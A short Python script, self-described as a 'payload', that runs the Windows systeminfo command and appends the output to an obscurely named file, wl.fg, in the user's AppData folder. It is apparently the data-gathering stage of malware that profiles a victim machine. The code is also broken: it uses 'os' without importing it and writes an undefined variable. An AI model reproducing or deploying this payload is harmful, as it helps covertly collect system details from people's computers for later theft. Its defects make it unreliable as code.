from operator import le
import subprocess
import sys

command = "systeminfo"
sysinfos = subprocess.check_output(command, shell=True) 
sysinfo = sysinfos.decode('latin_1', 'replace')
auxi = ""
auxi += "-- System Info \n"
auxi += str(sysinfo)
auxi += "\n"
print(auxi)
ptp = os.environ['appdata']
fss = open(f"{ptp}{os.sep}wl.fg", "a")
fss.write(auxiliar)
fss.close()
"""
This payload get computer info and write it into wl.fg
"""

